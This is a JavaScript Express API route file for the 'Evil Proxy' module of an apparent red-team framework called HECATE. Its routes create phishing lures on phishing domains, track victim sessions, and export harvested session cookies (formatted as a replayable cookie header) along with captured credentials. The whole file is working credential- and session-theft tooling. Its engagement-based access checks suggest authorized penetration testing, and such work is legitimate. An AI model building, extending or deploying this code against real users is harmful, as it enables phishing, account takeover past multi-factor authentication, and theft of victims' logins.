'use strict';

/**
 * HECATE Evil Proxy — API Routes
 * Mounted at /api/v1/evil-proxy by the main router.
 */

const { Router }      = require('express');
const phishletStore   = require('../phishlet/store');
const epStore         = require('../storage/evil-proxy-store');
const sessionMonitor  = require('../harvest/session-monitor');
const { HecateError } = require('../../../api/middleware/error-handler');
const { requireEngagement, requireResource } = require('../../../core/auth/authorization');

const router = Router();

// ── Lures ─────────────────────────────────────────────────────────────────────

// GET /evil-proxy/lures?eid=
router.get('/lures', (req, res, next) => {
  try {
    const engagementId = req.query.eid ?? null;
    if (engagementId) requireEngagement(req, engagementId);
    const lures = phishletStore.listLures(engagementId);
    res.json({ lures: lures.map(safeLure), total: lures.length });
  } catch (err) { next(err); }
});

// POST /evil-proxy/lures — create a lure
router.post('/lures', async (req, res, next) => {
  try {
    const { engagementId, phishletName, phishDomain, phishletOverride } = req.body ?? {};
    if (!engagementId) throw new HecateError('HECATE_BAD_INPUT', 'engagementId required');
    requireEngagement(req, engagementId);
    if (!phishDomain)  throw new HecateError('HECATE_BAD_INPUT', 'phishDomain required');
    if (!phishletName && !phishletOverride) {
      throw new HecateError('HECATE_BAD_INPUT', 'phishletName or phishletOverride required');
    }

    const lureId = phishletStore.addLure({ engagementId, phishletName, phishDomain, phishletOverride });
    const lure   = phishletStore.getLure(lureId);
    epStore.saveLure(lure);

    res.status(201).json({ lure: safeLure(lure) });
  } catch (err) { next(err); }
});

// GET /evil-proxy/lures/:id
router.get('/lures/:id', (req, res, next) => {
  try {
    const lure = phishletStore.getLure(req.params.id);
    requireResource(req, lure, 'Lure');
    if (!lure) throw new HecateError('HECATE_NOT_FOUND', 'Lure not found');
    res.json({ lure: safeLure(lure) });
  } catch (err) { next(err); }
});

// DELETE /evil-proxy/lures/:id — disable lure
router.delete('/lures/:id', (req, res, next) => {
  try {
    const lure = phishletStore.getLure(req.params.id);
    requireResource(req, lure, 'Lure');
    const ok = phishletStore.disableLure(req.params.id);
    if (!ok) throw new HecateError('HECATE_NOT_FOUND', 'Lure not found');
    res.status(204).end();
  } catch (err) { next(err); }
});

// ── Sessions ──────────────────────────────────────────────────────────────────

// GET /evil-proxy/sessions?eid=&lureId=&state=
router.get('/sessions', (req, res, next) => {
  try {
    const { eid, lureId, state } = req.query;
    if (eid) requireEngagement(req, eid);
    if (lureId) requireResource(req, phishletStore.getLure(lureId), 'Lure');
    const sessions = sessionMonitor.list({
      engagementId: eid, lureId, state
    });
    res.json({ sessions, total: sessions.length });
  } catch (err) { next(err); }
});

// GET /evil-proxy/sessions/stats
router.get('/sessions/stats', (req, res, next) => {
  try {
    res.json(sessionMonitor.stats());
  } catch (err) { next(err); }
});

// GET /evil-proxy/sessions/:lureId/:victimSid — safe view
router.get('/sessions/:lureId/:victimSid', (req, res, next) => {
  try {
    const lure = phishletStore.getLure(req.params.lureId);
    requireResource(req, lure, 'Lure');
    const s = sessionMonitor.get(req.params.lureId, req.params.victimSid);
    if (!s) throw new HecateError('HECATE_NOT_FOUND', 'Session not found');
    res.json({ session: sessionMonitor.list({ lureId: req.params.lureId }).find(x => x.victimSid === req.params.victimSid) });
  } catch (err) { next(err); }
});

// GET /evil-proxy/sessions/:lureId/:victimSid/export — privileged: includes cookie values
router.get('/sessions/:lureId/:victimSid/export', async (req, res, next) => {
  try {
    const lure = phishletStore.getLure(req.params.lureId);
    requireResource(req, lure, 'Lure');
    const s = sessionMonitor.getPrivileged(req.params.lureId, req.params.victimSid);
    if (!s) throw new HecateError('HECATE_NOT_FOUND', 'Session not found');

    // Only export harvested sessions
    if (s.state !== 'harvested') {
      throw new HecateError('HECATE_BAD_INPUT', `Session not harvested yet (state: ${s.state})`);
    }

    // Load persisted data (encrypted at rest, decrypted here)
    const dbRecord = epStore.getSessionRecord(s.lureId, s.victimSid);
    let cookies     = s.capturedCookies;
    let credentials = s.capturedCredentials;

    if (dbRecord) {
      cookies     = await epStore.getCookies(dbRecord.id);
      credentials = await epStore.getCredentials(dbRecord.id);
    }

    const cookieHeader = cookies.map(c => `${c.name}=${c.value}`).join('; ');

    res.json({
      session: {
        lureId:        s.lureId,
        victimSid:     s.victimSid,
        phishletName:  s.phishletName,
        state:         s.state,
        harvestedAt:   s.harvestedAt,
        cookieHeader,
        cookies,
        credentials,
        visitedUrls:   s.visitedUrls,
      }
    });
  } catch (err) { next(err); }
});

// ── Phishlets ─────────────────────────────────────────────────────────────────

// GET /evil-proxy/phishlets — list available phishlet names
router.get('/phishlets', (req, res, next) => {
  try {
    const loader = require('../phishlet/loader');
    res.json({ phishlets: loader.list() });
  } catch (err) { next(err); }
});

// ── Misc ──────────────────────────────────────────────────────────────────────

// GET /evil-proxy/status
router.get('/status', (req, res) => {
  const lures    = phishletStore.listLures();
  const active   = lures.filter(l => l.active).length;
  const sessions = sessionMonitor.stats();
  res.json({ lures: lures.length, activeLures: active, sessions });
});

// ── Helpers ───────────────────────────────────────────────────────────────────

function safeLure(lure) {
  return {
    id:           lure.id,
    engagementId: lure.engagementId,
    phishletName: lure.phishletName,
    phishDomain:  lure.phishDomain,
    active:       lure.active,
    createdAt:    lure.createdAt,
    proxyHosts:   lure.phishlet.proxyHosts,
    authUrls:     lure.phishlet.authUrls,
  };
}

module.exports = router;
